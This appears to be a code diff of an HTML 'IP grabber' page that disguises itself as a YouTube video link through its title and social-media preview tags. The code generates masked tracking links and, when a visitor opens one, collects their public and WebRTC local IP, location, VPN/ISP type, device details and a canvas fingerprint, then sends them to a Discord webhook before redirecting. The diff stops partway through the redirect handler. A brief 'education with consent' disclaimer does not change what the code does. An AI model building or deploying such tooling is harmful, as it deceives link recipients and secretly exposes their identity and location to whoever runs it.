@@ -3,393 +3,671 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Grabber · Final mit Diagnose</title>
+    <title>YouTube Video</title>
+    <meta property="og:title" content="YouTube Video">
+    <meta property="og:description" content="Schau dir dieses Video an!">
+    <meta property="og:type" content="video.other">
+    <meta property="og:image" content="https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="YouTube Video">
+    <meta name="twitter:description" content="Schau dir dieses Video an!">
+    <meta name="twitter:image" content="https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
+        :root {
+            --bg: #ffffff;
+            --text: #0f172a;
+            --card: #f1f5f9;
+            --border: #cbd5e1;
+            --primary: #2563eb;
+        }
+        body.dark-mode {
+            --bg: #0f172a;
+            --text: #e2e8f0;
+            --card: #1e293b;
+            --border: #334155;
+            --primary: #3b82f6;
+        }
         body { visibility: hidden; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
-        body.admin-mode { visibility: visible; background: #f1f5f9; min-height: 100vh; padding: 20px; color: #0f172a; }
-        .container { max-width: 800px; margin: 0 auto; background: white; border-radius: 28px; box-shadow: 0 20px 40px -10px rgba(0,0,0,0.1); padding: 30px; }
-        h1 { display: flex; align-items: center; gap: 10px; } h1::before { content: "🌐"; font-size: 2rem; }
+        body.admin-mode { visibility: visible; background: var(--card); min-height: 100vh; padding: 20px; color: var(--text); }
+        .container { max-width: 950px; margin: 0 auto; background: var(--bg); border-radius: 28px; box-shadow: 0 20px 40px -10px rgba(0,0,0,0.1); padding: 30px; transition: background 0.3s, color 0.3s; position: relative; }
+        h1 { display: flex; align-items: center; gap: 10px; } h1::before { content: "🎬"; font-size: 2rem; }
         .warning { background: #fffbeb; border: 1px solid #fcd34d; color: #92400e; padding: 16px; border-radius: 16px; margin-bottom: 28px; }
-        .tabs { display: flex; gap: 6px; margin-bottom: 24px; border-bottom: 2px solid #cbd5e1; }
+        .tabs { display: flex; gap: 6px; margin-bottom: 24px; border-bottom: 2px solid var(--border); flex-wrap: wrap; }
         .tab { padding: 12px 24px; background: none; border: none; cursor: pointer; font-weight: 600; color: #64748b; border-radius: 40px 40px 0 0; }
-        .tab.active { color: #2563eb; border-bottom: 3px solid #2563eb; background: white; }
+        .tab.active { color: var(--primary); border-bottom: 3px solid var(--primary); background: var(--bg); }
         .tab-content { display: none; } .tab-content.active { display: block; }
         .form-group { margin-bottom: 24px; } label { display: block; margin-bottom: 8px; font-weight: 600; }
-        input, select, textarea { width: 100%; padding: 14px 18px; border: 1.5px solid #cbd5e1; border-radius: 20px; font-size: 1rem; background: white; }
-        button { background: #2563eb; color: white; border: none; padding: 14px 28px; border-radius: 40px; font-weight: 600; cursor: pointer; }
-        button.copy-btn { background: #10b981; } button.secondary { background: #e2e8f0; color: #1e293b; }
-        .url-display { background: #f8fafc; padding: 16px; border-radius: 24px; font-family: monospace; word-break: break-all; border: 1.5px solid #cbd5e1; }
-        .stats { margin-top: 20px; padding: 16px; background: #f1f5f9; border-radius: 18px; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; } th { background: #eef2ff; padding: 12px; } td { padding: 12px; border-bottom: 1px solid #e2e8f0; }
+        input, select, textarea { width: 100%; padding: 14px 18px; border: 1.5px solid var(--border); border-radius: 20px; font-size: 1rem; background: var(--bg); color: var(--text); box-sizing: border-box; }
+        button { background: var(--primary); color: white; border: none; padding: 14px 28px; border-radius: 40px; font-weight: 600; cursor: pointer; transition: 0.2s; }
+        button:hover { filter: brightness(1.1); transform: translateY(-1px); }
+        button.copy-btn { background: #10b981; } button.secondary { background: var(--card); color: var(--text); border: 1px solid var(--border); }
+        .url-display { background: var(--card); padding: 16px; border-radius: 24px; font-family: monospace; word-break: break-all; border: 1.5px solid var(--border); margin: 10px 0; }
+        .stats { margin-top: 20px; padding: 16px; background: var(--card); border-radius: 18px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: var(--bg); border-radius: 20px; overflow: hidden; }
+        th { background: #eef2ff; padding: 12px; } td { padding: 12px; border-bottom: 1px solid var(--border); }
         .flex-row { display: flex; gap: 12px; align-items: center; flex-wrap: wrap; }
-        .note { background: #f8fafc; padding: 8px 12px; border-radius: 12px; font-size: 0.85rem; color: #475569; margin-top: 6px; }
-        .mask-note { background: #e6f7ff; border-left: 4px solid #0284c7; padding: 12px 16px; border-radius: 12px; margin: 16px 0; }
+        .note { background: var(--card); padding: 8px 12px; border-radius: 12px; font-size: 0.85rem; color: #475569; margin-top: 6px; }
         .status-badge { padding: 4px 12px; border-radius: 30px; font-size: 0.8rem; font-weight: 500; display: inline-block; }
         .status-ok { background: #dcfce7; color: #166534; }
-        .status-warn { background: #fef9c3; color: #854d0e; }
         .status-error { background: #fee2e2; color: #b91c1c; }
-        .diagnostic-box { background: #f1f5f9; padding: 16px; border-radius: 16px; margin-top: 16px; }
+        .diagnostic-box { background: var(--card); padding: 16px; border-radius: 16px; margin-bottom: 20px; }
+        #map { height: 200px; width: 100%; border-radius: 16px; margin-top: 10px; }
+        .dark-toggle { position: absolute; top: 20px; right: 20px; background: var(--card); border: 1px solid var(--border); border-radius: 50%; width: 40px; height: 40px; cursor: pointer; font-size: 1.2rem; }
+        .mask-note { background: #e6f7ff; border-left: 4px solid #0284c7; padding: 12px 16px; border-radius: 12px; margin: 16px 0; }
+        #qrContainer { margin: 20px 0; display: flex; justify-content: center; }
     </style>
 </head>
 <body>
     <div id="adminPanel" style="display:none;">
+        <button class="dark-toggle" onclick="document.body.classList.toggle('dark-mode')">🌓</button>
         <div class="container">
-            <h1>IP‑Logger · Final mit Diagnose</h1>
-            <div class="warning"><strong>⚖️ Nur für Bildungs‑ und Testzwecke mit Einwilligung.</strong><br>Zeigt öffentliche und lokale IP (sofern technisch möglich).</div>
+            <h1>YouTube‑Linkgenerator</h1>
+            <div class="warning"><strong>⚖️ Nur für Bildungs‑ und Testzwecke mit Einwilligung.</strong><br>Erweiterter Logger mit Geräte‑Fingerprint, QR‑Code, Bot‑Erkennung und mehr.</div>
             <div class="tabs">
                 <div class="tab active" data-tab="generator">🔗 Link Generator</div>
                 <div class="tab" data-tab="logs">📋 Lokale Logs</div>
                 <div class="tab" data-tab="settings">⚙️ Einstellungen</div>
             </div>
+
             <!-- Generator -->
             <div id="generator" class="tab-content active">
-                <!-- WebRTC Status live -->
-                <div id="webrtcLiveStatus" class="diagnostic-box" style="margin-bottom:20px;"></div>
-                
-                <div class="form-group"><label>🎯 Ziel‑URL</label><input type="url" id="targetUrl" value="https://example.com"></div>
-                <div class="form-group"><label>📡 Discord Webhook URL</label><input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/..."><div class="flex-row" style="margin-top:8px;"><button class="secondary" id="testWebhookBtn">🧪 Webhook testen</button><span id="testResult"></span></div></div>
+                <div class="diagnostic-box" id="webrtcLiveStatus"></div>
+
+                <!-- Link-Gültigkeit -->
+                <div class="form-group flex-row">
+                    <label style="margin-right:10px;">⏳ Link‑Gültigkeit:</label>
+                    <select id="linkValidity">
+                        <option value="unlimited">Unbegrenzt</option>
+                        <option value="once">Einmal klickbar</option>
+                        <option value="date">Bis Datum</option>
+                    </select>
+                    <input type="datetime-local" id="validUntil" style="display:none; width:auto;">
+                </div>
+
+                <!-- Weiterleitungs‑Modus -->
+                <div class="form-group">
+                    <label>🔄 Weiterleitungs‑Modus</label>
+                    <select id="redirectMode">
+                        <option value="single">Einzelne URL</option>
+                        <option value="random">Zufällige URL (aus Liste)</option>
+                        <option value="sequential">Nacheinander (Rotation)</option>
+                    </select>
+                    <input type="url" id="targetUrl" value="https://example.com">
+                    <div id="multiTargetContainer" style="display:none; margin-top:12px;">
+                        <textarea id="multiTargets" rows="3" placeholder="https://ziel1.com&#10;https://ziel2.com&#10;https://ziel3.com"></textarea>
+                    </div>
+                </div>
+
+                <div class="form-group"><label>📡 Discord Webhook URL</label><input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/..."><button class="secondary" id="testWebhookBtn">🧪 Test</button><span id="testResult"></span></div>
                 <div class="form-group"><label>🌍 Server‑Basis‑URL</label><input type="url" id="baseUrlInput" placeholder="Leer = aktuelle Adresse"></div>
                 <div class="form-group"><label>💬 Eigene Nachricht</label><input type="text" id="customMsg" placeholder="Neuer Klick"></div>
-                <div class="form-group"><label>👤 Kennzeichnung (z.B. Name des Empfängers)</label><input type="text" id="labelInput" placeholder="Max / Testperson 1"></div>
-                
-                <!-- Tarn‑Domain Auswahl -->
+                <div class="form-group"><label>👤 Kennzeichnung</label><input type="text" id="labelInput" placeholder="Max / Testperson 1"></div>
+
+                <!-- Ladeanimation anpassen -->
+                <div class="form-group">
+                    <label>🎨 Ladeanimation</label>
+                    <input type="text" id="customLoaderText" placeholder="Eigener Text (leer = Standard)">
+                    <input type="url" id="customLoaderGif" placeholder="GIF‑URL (optional)" style="margin-top:8px;">
+                </div>
+
                 <div class="form-group">
                     <label>🎭 Tarn‑Domain</label>
                     <select id="maskPreset">
-                        <option value="">Keine Tarnung (echte URL anzeigen)</option>
-                        <option value="https://google.com">google.com</option>
-                        <option value="https://youtube.com">youtube.com</option>
-                        <option value="https://facebook.com">facebook.com</option>
-                        <option value="https://twitter.com">twitter.com</option>
-                        <option value="https://instagram.com">instagram.com</option>
-                        <option value="https://tiktok.com">tiktok.com</option>
-                        <option value="https://discord.com">discord.com</option>
-                        <option value="custom">✨ Eigene Domain angeben</option>
+                        <option value="">Keine Tarnung</option>
+                        <option value="https://youtube.com/watch?v=dQw4w9WgXcQ">youtube.com/watch?v=...</option>
+                        <option value="custom">✨ Eigener Text</option>
                     </select>
                     <div id="customMaskContainer" style="display:none; margin-top:12px;">
-                        <input type="text" id="customMaskUrl" placeholder="https://deinedomain.de">
+                        <input type="text" id="customMaskUrl" placeholder="https://deinedomain.de/pfad">
                     </div>
                 </div>
-                <div class="form-group">
-                    <label>📎 Pfad (optional)</label>
-                    <input type="text" id="maskPath" placeholder="/gewinnspiel">
-                </div>
-                <div class="form-group">
-                    <label><input type="checkbox" id="embedTargetInMask"> 🔗 Ziel‑URL in Tarn‑Link einbetten</label>
-                </div>
-                
+
                 <button id="generateBtn">✨ Link generieren</button>
                 <div id="resultPanel" style="display:none; margin-top:28px;">
-                    <h3>🔽 Dein Link</h3>
-                    <div><strong>🔗 Echte URL:</strong><div class="url-display" id="realUrlDisplay" style="font-size:0.9rem; opacity:0.8;"></div></div>
-                    <div style="margin-top:16px;"><strong>🎭 Maskierte URL:</strong><div class="url-display" id="maskedUrlDisplay" style="font-weight:500;"></div></div>
-                    <div class="mask-note">⚠️ Der untere Link ist nur Anzeigetext. Der Empfänger klickt auf die echte URL.</div>
-                    <div class="flex-row" style="margin-top:16px;">
-                        <button class="copy-btn" id="copyMaskedBtn">📋 Tarn‑Link kopieren</button>
-                        <button class="secondary" id="copyRealBtn">📋 Echten Link kopieren</button>
+                    <h3>🔽 Dein fertiger Link</h3>
+                    <div class="url-display" id="finalUrlDisplay"></div>
+                    <div id="qrContainer"></div>
+                    <div class="flex-row">
+                        <button class="copy-btn" id="copyFinalBtn">📋 Link kopieren</button>
                         <button class="secondary" id="testOwnBtn">🧪 Selbst testen</button>
                     </div>
                     <div class="stats"><p>👁️ Klicks: <strong id="clickCount">0</strong> | Letzter: <span id="lastAccess">—</span></p><p>🔍 ID: <span id="linkIdDisplay"></span></p></div>
                 </div>
             </div>
+
             <!-- Logs -->
             <div id="logs" class="tab-content">
-                <h3>📜 Lokale Logs</h3><button class="secondary" id="clearLogsBtn">🗑️ Alle löschen</button>
-                <table><thead><tr><th>Öffentliche IP</th><th>Geräte‑IP (lokal)</th><th>Zeit</th><th>User‑Agent</th><th>Link</th></tr></thead><tbody id="logsBody"></tbody></table>
+                <h3>📜 Lokale Logs</h3>
+                <div class="flex-row" style="justify-content: space-between;">
+                    <button class="secondary" id="clearLogsBtn">🗑️ Alle löschen</button>
+                    <button class="secondary" id="exportCsvBtn">📥 CSV exportieren</button>
+                </div>
+                <table><thead><tr><th>Öff. IP</th><th>Typ</th><th>Gerät</th><th>Fingerprint</th><th>Zeit</th><th>Bot</th></tr></thead><tbody id="logsBody"></tbody></table>
+                <div id="mapContainer" style="margin-top:20px;"><div id="map"></div></div>
             </div>
+
             <!-- Einstellungen -->
             <div id="settings" class="tab-content">
                 <h3>Einstellungen</h3>
                 <div class="form-group"><label>⏱️ Verzögerung (ms)</label><input type="number" id="delayInput" value="3000"></div>
                 <div class="form-group"><label><input type="checkbox" id="collectUACb" checked> User‑Agent erfassen</label></div>
-                <div class="form-group"><label><input type="checkbox" id="collectLocationCb"> Standort ermitteln (ipapi.co)</label></div>
-                <div class="form-group">
-                    <label><input type="checkbox" id="collectLocalIPCb"> 🏠 Geräte‑IP (lokal) via WebRTC ermitteln</label>
-                    <div class="note" id="webrtcStatusSettings"></div>
-                </div>
-                <div class="form-group">
-                    <label><input type="checkbox" id="useFallbackLocalIPCb"> 🧪 Fallback: Feste Test‑IP anzeigen (nur für Debug)</label>
-                    <div class="note">⚠️ Aktivieren Sie dies NUR zum Testen, falls WebRTC nicht funktioniert. Zeigt immer 192.168.1.100 an.</div>
-                </div>
+                <div class="form-group"><label><input type="checkbox" id="collectLocationCb"> Standort & Karte</label></div>
+                <div class="form-group"><label><input type="checkbox" id="collectLocalIPCb"> 🏠 Geräte‑IP lokal</label><div class="note" id="webrtcStatusSettings"></div></div>
+                <div class="form-group"><label><input type="checkbox" id="collectIPTypeCb" checked> 🔍 IP‑Typ (VPN/Hosting/ISP)</label></div>
+                <div class="form-group"><label><input type="checkbox" id="collectDeviceCb" checked> 📱 Gerätedaten (Auflösung, etc.)</label></div>
+                <div class="form-group"><label><input type="checkbox" id="collectFingerprintCb" checked> 🕵️ Canvas‑Fingerprint</label></div>
+                <div class="form-group"><label><input type="checkbox" id="detectBotCb" checked> 🤖 Bot‑Erkennung</label></div>
                 <div class="form-group"><label><input type="checkbox" id="storeLocalCb" checked> Lokal speichern</label></div>
                 <div class="form-group"><label>Standard‑Basis‑URL</label><input type="url" id="defaultBaseUrl"></div>
                 <button id="saveSettingsBtn">💾 Speichern</button>
             </div>
         </div>
     </div>
+
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
     <script>
-        (function(){
-            "use strict";
-            // ---------- STATE ----------
-            let links=[],ipLogs=[],settings={delay:3000,collectUA:true,collectLocation:false,collectLocalIP:false,useFallbackLocalIP:false,storeLocal:true,defaultBase:''},currentLinkId=null;
-            let webRTCSupported = false;
-            let webRTCStatusMessage = '';
+    (function(){
+        "use strict";
 
-            // ---------- WebRTC Check (ausführlich) ----------
-            function checkWebRTCSupport(){
-                const hasRTCPeerConnection = typeof RTCPeerConnection !== 'undefined';
-                const isSecure = location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
-                webRTCSupported = hasRTCPeerConnection && isSecure;
-                
-                let reason = '';
-                if(!hasRTCPeerConnection) reason = 'Ihr Browser unterstützt kein WebRTC.';
-                else if(!isSecure) reason = 'Die Seite wird nicht über HTTPS geladen – WebRTC erfordert einen sicheren Kontext (HTTPS oder localhost).';
-                
-                webRTCStatusMessage = webRTCSupported ? '✅ WebRTC ist verfügbar. Lokale IP kann ermittelt werden.' : `❌ ${reason}`;
-                
-                // UI updaten
-                const liveDiv = document.getElementById('webrtcLiveStatus');
-                if(liveDiv){
-                    liveDiv.innerHTML = `<span class="status-badge ${webRTCSupported?'status-ok':'status-error'}">${webRTCSupported?'✅':'❌'}</span> <strong>WebRTC-Status:</strong> ${webRTCStatusMessage}`;
-                    if(!webRTCSupported && settings.collectLocalIP){
-                        liveDiv.innerHTML += '<br><small>Die lokale IP wird nicht erfasst. Aktivieren Sie ggf. den Fallback in den Einstellungen.</small>';
+        // ---------- GLOBAL STATE ----------
+        const settings = {
+            delay: 3000,
+            collectUA: true,
+            collectLocation: false,
+            collectLocalIP: false,
+            collectIPType: true,
+            collectDevice: true,
+            collectFingerprint: true,
+            detectBot: true,
+            storeLocal: true,
+            defaultBase: ''
+        };
+        let links = [];
+        let ipLogs = [];
+        let currentLinkId = null;
+        let webRTCSupported = false;
+        let webRTCStatusMessage = '';
+
+        // ---------- WEBRTC CHECK ----------
+        function checkWebRTCSupport(){
+            const hasRTCPeerConnection = typeof RTCPeerConnection !== 'undefined';
+            const isSecure = location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
+            webRTCSupported = hasRTCPeerConnection && isSecure;
+            webRTCStatusMessage = webRTCSupported ? '✅ WebRTC verfügbar.' : `❌ ${!hasRTCPeerConnection?'Browser unterstützt kein WebRTC.':'Keine HTTPS-Verbindung.'}`;
+            const liveDiv = document.getElementById('webrtcLiveStatus');
+            if(liveDiv) liveDiv.innerHTML = `<span class="status-badge ${webRTCSupported?'status-ok':'status-error'}">${webRTCSupported?'✅':'❌'}</span> ${webRTCStatusMessage}`;
+            const settingsDiv = document.getElementById('webrtcStatusSettings');
+            if(settingsDiv) settingsDiv.textContent = webRTCStatusMessage;
+        }
+
+        // ---------- UTILS ----------
+        function generateId(){ return Date.now()+'-'+Math.random().toString(36).substr(2,8); }
+        function formatDate(iso){ return new Date(iso).toLocaleString('de-DE'); }
+        function base64Encode(str){ return btoa(unescape(encodeURIComponent(str))); }
+        function base64Decode(str){ return decodeURIComponent(escape(atob(str))); }
+
+        // ---------- STORAGE ----------
+        function loadStorage(){
+            try{
+                const s = JSON.parse(localStorage.getItem('ipg_settings'));
+                if(s) Object.assign(settings, s);
+                const l = JSON.parse(localStorage.getItem('ipg_links'));
+                if(l) links = l;
+                const g = JSON.parse(localStorage.getItem('ipg_logs'));
+                if(g) ipLogs = g;
+            }catch(e){}
+            applySettingsToUI();
+            checkWebRTCSupport();
+            document.getElementById('baseUrlInput').value = settings.defaultBase || '';
+        }
+        function applySettingsToUI(){
+            document.getElementById('delayInput').value = settings.delay;
+            document.getElementById('collectUACb').checked = settings.collectUA;
+            document.getElementById('collectLocationCb').checked = settings.collectLocation;
+            document.getElementById('collectLocalIPCb').checked = settings.collectLocalIP;
+            document.getElementById('collectIPTypeCb').checked = settings.collectIPType;
+            document.getElementById('collectDeviceCb').checked = settings.collectDevice;
+            document.getElementById('collectFingerprintCb').checked = settings.collectFingerprint;
+            document.getElementById('detectBotCb').checked = settings.detectBot;
+            document.getElementById('storeLocalCb').checked = settings.storeLocal;
+            document.getElementById('defaultBaseUrl').value = settings.defaultBase || '';
+        }
+        function saveSettingsToStorage(){
+            const s = {
+                delay: parseInt(document.getElementById('delayInput').value)||3000,
+                collectUA: document.getElementById('collectUACb').checked,
+                collectLocation: document.getElementById('collectLocationCb').checked,
+                collectLocalIP: document.getElementById('collectLocalIPCb').checked,
+                collectIPType: document.getElementById('collectIPTypeCb').checked,
+                collectDevice: document.getElementById('collectDeviceCb').checked,
+                collectFingerprint: document.getElementById('collectFingerprintCb').checked,
+                detectBot: document.getElementById('detectBotCb').checked,
+                storeLocal: document.getElementById('storeLocalCb').checked,
+                defaultBase: document.getElementById('defaultBaseUrl').value.trim()
+            };
+            Object.assign(settings, s);
+            localStorage.setItem('ipg_settings', JSON.stringify(settings));
+            checkWebRTCSupport();
+        }
+        function saveLinks(){ if(settings.storeLocal) localStorage.setItem('ipg_links', JSON.stringify(links)); }
+        function saveLogs(){ if(settings.storeLocal) localStorage.setItem('ipg_logs', JSON.stringify(ipLogs)); }
+
+        // ---------- NETWORK & FINGERPRINT ----------
+        async function fetchPublicIP(){
+            try{
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                return d.ip;
+            }catch(e){ return '0.0.0.0'; }
+        }
+        async function fetchLocalIP(){
+            if(!settings.collectLocalIP || !webRTCSupported) return null;
+            return new Promise((resolve) => {
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                pc.createDataChannel('ip');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => resolve(null));
+                let resolved = false;
+                const candidates = [];
+                pc.onicecandidate = (ice) => {
+                    if(!ice || !ice.candidate) return;
+                    const match = ice.candidate.candidate.match(/(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})/);
+                    if(match) candidates.push(match[1]);
+                };
+                pc.onicegatheringstatechange = () => {
+                    if(pc.iceGatheringState === 'complete' && !resolved){
+                        resolved = true;
+                        pc.close();
+                        resolve(candidates.find(ip => ip.startsWith('192.168')) || candidates[0] || null);
                     }
-                }
-                const settingsDiv = document.getElementById('webrtcStatusSettings');
-                if(settingsDiv){
-                    settingsDiv.innerHTML = webRTCStatusMessage;
-                }
-                return webRTCSupported;
-            }
+                };
+                setTimeout(() => { if(!resolved){ resolved = true; pc.close(); resolve(candidates[0] || null); } }, 3000);
+            });
+        }
+        async function fetchLocation(ip){
+            if(!settings.collectLocation) return null;
+            try{
+                const r = await fetch(`https://ipapi.co/${ip}/json/`);
+                const d = await r.json();
+                if(d.error) return null;
+                return { city: d.city, country: d.country_name, lat: d.latitude, lon: d.longitude, text: `${d.city||'Unbekannt'}, ${d.country_name||''}` };
+            }catch(e){ return null; }
+        }
+        async function fetchIPType(ip){
+            if(!settings.collectIPType) return null;
+            try{
+                const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,isp,org,proxy,hosting`);
+                const d = await r.json();
+                if(d.status !== 'success') return null;
+                let type = '🏠 Privat';
+                if(d.proxy) type = '🔒 VPN/Proxy';
+                if(d.hosting) type = '🏢 Hosting';
+                return `${type} (${d.isp || d.org || 'Unbekannt'})`;
+            }catch(e){ return null; }
+        }
+        function getDeviceInfo(){
+            if(!settings.collectDevice) return null;
+            return {
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                cores: navigator.hardwareConcurrency || '?'
+            };
+        }
+        async function getCanvasFingerprint(){
+            if(!settings.collectFingerprint) return null;
+            try{
+                const canvas = document.createElement('canvas');
+                canvas.width = 200; canvas.height = 50;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125,1,62,20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Fingerprint', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Test', 4, 17);
+                return canvas.toDataURL().slice(-32); // einfacher Hash
+            }catch(e){ return null; }
+        }
+        function isBot(ua){
+            if(!settings.detectBot) return false;
+            const bots = ['bot','crawler','spider','googlebot','bingbot','slurp','duckduckbot','baiduspider','yandex','facebot','ia_archiver','chatgpt','gpt-3'];
+            const u = ua.toLowerCase();
+            return bots.some(b => u.includes(b));
+        }
 
-            // ---------- UTILS ----------
-            function generateId(){return Date.now()+'-'+Math.random().toString(36).substr(2,8);}
-            function formatDate(iso){return new Date(iso).toLocaleString('de-DE');}
-            function base64Encode(str){return btoa(unescape(encodeURIComponent(str)));}
-            function base64Decode(str){return decodeURIComponent(escape(atob(str)));}
-
-            // ---------- STORAGE ----------
-            function loadStorage(){
-                try{
-                    const l=localStorage.getItem('ipg_links');if(l)links=JSON.parse(l);
-                    const g=localStorage.getItem('ipg_logs');if(g)ipLogs=JSON.parse(g);
-                    const s=localStorage.getItem('ipg_settings');if(s)settings={...settings,...JSON.parse(s)};
-                }catch(e){}
-                if(document.getElementById('delayInput')){
-                    document.getElementById('delayInput').value=settings.delay;
-                    document.getElementById('collectUACb').checked=settings.collectUA;
-                    document.getElementById('collectLocationCb').checked=settings.collectLocation;
-                    document.getElementById('collectLocalIPCb').checked=settings.collectLocalIP;
-                    document.getElementById('useFallbackLocalIPCb').checked=settings.useFallbackLocalIP;
-                    document.getElementById('storeLocalCb').checked=settings.storeLocal;
-                    document.getElementById('defaultBaseUrl').value=settings.defaultBase||'';
-                }
-                checkWebRTCSupport();
-            }
-            function saveLinks(){if(settings.storeLocal)localStorage.setItem('ipg_links',JSON.stringify(links));}
-            function saveLogs(){if(settings.storeLocal)localStorage.setItem('ipg_logs',JSON.stringify(ipLogs));}
-            function saveSettings(){
-                if(!document.getElementById('delayInput'))return;
-                settings.delay=parseInt(document.getElementById('delayInput').value,10)||3000;
-                settings.collectUA=document.getElementById('collectUACb').checked;
-                settings.collectLocation=document.getElementById('collectLocationCb').checked;
-                settings.collectLocalIP=document.getElementById('collectLocalIPCb').checked;
-                settings.useFallbackLocalIP=document.getElementById('useFallbackLocalIPCb').checked;
-                settings.storeLocal=document.getElementById('storeLocalCb').checked;
-                settings.defaultBase=document.getElementById('defaultBaseUrl').value.trim();
-                localStorage.setItem('ipg_settings',JSON.stringify(settings));
-                checkWebRTCSupport();
-                alert('Einstellungen gespeichert.');
-            }
-
-            // ---------- IP-ERMITTLUNG ----------
-            async function fetchPublicIP(){try{const r=await fetch('https://api.ipify.org?format=json');return(await r.json()).ip}catch(e){return '0.0.0.0';}}
-            
-            async function fetchLocalIP(){
-                if(!settings.collectLocalIP) return null;
-                if(settings.useFallbackLocalIP){
-                    console.log('[Fallback] Verwende simulierte lokale IP 192.168.1.100');
-                    return '192.168.1.100 (simuliert)';
-                }
-                if(!webRTCSupported) return null;
-                
-                return new Promise((resolve)=>{
-                    try{
-                        const pc=new RTCPeerConnection({iceServers:[]});
-                        pc.createDataChannel('');
-                        pc.createOffer().then(offer=>pc.setLocalDescription(offer)).catch(()=>{resolve(null);});
-                        pc.onicecandidate=(ice)=>{
-                            if(!ice||!ice.candidate||!ice.candidate.candidate)return;
-                            const candidate=ice.candidate.candidate;
-                            const ipRegex=/([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-                            const match=candidate.match(ipRegex);
-                            if(match){
-                                const ip=match[1];
-                                if(!ip.startsWith('127.')&&!ip.startsWith('::1')){
-                                    pc.close();
-                                    resolve(ip);
-                                }
-                            }
-                        };
-                        setTimeout(()=>{pc.close();resolve(null);},2000);
-                    }catch(e){resolve(null);}
+        // ---------- DISCORD ----------
+        async function sendDiscord(webhookUrl, data){
+            if(!webhookUrl || !webhookUrl.includes('discord.com/api/webhooks')) return false;
+            const description = [
+                data.customMsg || 'Neuer Klick',
+                `🌐 Öffentliche IP: \`${data.publicIP}\``,
+                data.localIP ? `🏠 Geräte‑IP: \`${data.localIP}\`` : '',
+                data.ipType ? `🔍 IP‑Typ: ${data.ipType}` : '',
+                data.location ? `📍 Standort: ${data.location.text}` : '',
+                data.label ? `👤 Gekennzeichnet: **${data.label}**` : '',
+                data.device ? `📱 Gerät: ${data.device.screen} | ${data.device.timezone} | ${data.device.language}` : '',
+                data.fingerprint ? `🕵️ Fingerprint: ${data.fingerprint}` : '',
+                data.bot ? `🤖 Bot erkannt!` : '',
+                `🖥️ User‑Agent: ${data.ua || 'nicht erfasst'}`
+            ].filter(Boolean).join('\n');
+            try{
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [{ title: "🌍 IP‑Logger", description, color: 0x3b82f6, timestamp: new Date().toISOString(), footer: { text: `Link‑ID: ${data.linkId}` } }] })
                 });
-            }
-            
-            async function fetchLocation(ip){if(!settings.collectLocation)return null;try{const r=await fetch(`https://ipapi.co/${ip}/json/`);const d=await r.json();if(d.error)return null;return `${d.city||'Unbekannt'}, ${d.country_name||''}`.trim();}catch(e){return null;}}
-
-            // ---------- DISCORD SENDEN ----------
-            async function sendDiscord(webhookUrl, publicIP, localIP, ua, location, linkId, customMsg, label){
-                if(!webhookUrl||!webhookUrl.includes('discord.com/api/webhooks'))return false;
-                const locationText=location?`\n📍 Standort: ${location}`:'';
-                let localIPText = '';
-                if(settings.collectLocalIP){
-                    if(localIP) localIPText = `\n🏠 Geräte‑IP (lokal): \`${localIP}\``;
-                    else localIPText = `\n🏠 Geräte‑IP (lokal): nicht verfügbar (${webRTCSupported?'WebRTC fehlgeschlagen':'Browser/HTTPS-Problem'})`;
-                }
-                const labelText=label?`\n👤 Gekennzeichnet als: **${label}**`:'';
-                const description=`${customMsg||'Neuer Klick'}\n\n🌐 Öffentliche IP: \`${publicIP}\`${localIPText}${locationText}${labelText}\n🖥️ User‑Agent: ${ua||'nicht erfasst'}`;
-                const embed={title:"🌍 IP‑Logger",description,color:0x3b82f6,timestamp:new Date().toISOString(),footer:{text:`Link‑ID: ${linkId}`}};
-                try{
-                    const resp=await fetch(webhookUrl,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[embed]})});
-                    return resp.ok;
-                }catch(e){return false;}
-            }
-
-            // ---------- REDIRECT HANDLER ----------
-            async function handleRedirect(){
-                const params=new URLSearchParams(window.location.search);
-                const linkId=params.get('id'),target=params.get('to'),encodedWh=params.get('wh'),encodedMsg=params.get('msg'),encodedLabel=params.get('lbl'),debug=params.get('debug')==='1';
-                if(!linkId||!target||!encodedWh)return false;
-                let webhookUrl='',customMsg='',label='';
-                try{
-                    webhookUrl=base64Decode(encodedWh);
-                    if(encodedMsg)customMsg=base64Decode(encodedMsg);
-                    if(encodedLabel)label=base64Decode(encodedLabel);
-                }catch(e){document.body.innerHTML='<h2>Fehler: Ungültiger Link</h2>';document.body.style.visibility='visible';return true;}
-                
-                const publicIP=await fetchPublicIP();
